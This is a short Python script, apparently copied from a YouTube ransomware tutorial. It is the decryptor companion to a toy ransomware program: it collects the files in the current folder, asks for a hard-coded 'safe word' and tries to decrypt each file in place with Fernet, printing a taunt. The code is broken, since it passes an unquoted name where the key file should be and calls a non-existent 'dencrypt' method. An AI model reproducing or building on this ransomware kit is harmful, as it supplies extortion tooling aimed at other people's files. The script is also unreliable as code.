#!/usr/bin/env python3

"""
This is a script taken from NetworkChuck YouTube channel. It is a simple
python script. See my latest post at https://0x8c.org for more.
"""

import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
    if file == "givemeyourmoney.py" or file == "gotchabitch.key" or file == "dencrypt.py" :
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

with open(gotchabitch.py, "rb") as key:
    secretkey = key.read()

safeword = "RiRiWork"

user_safe_word = input("What's the safe word?")

if user_safe_word == safeword:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_dencrypted = Fernet(secretkey).dencrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_dencrypted)
        print("You lucky. Next time shit'll be harder.")
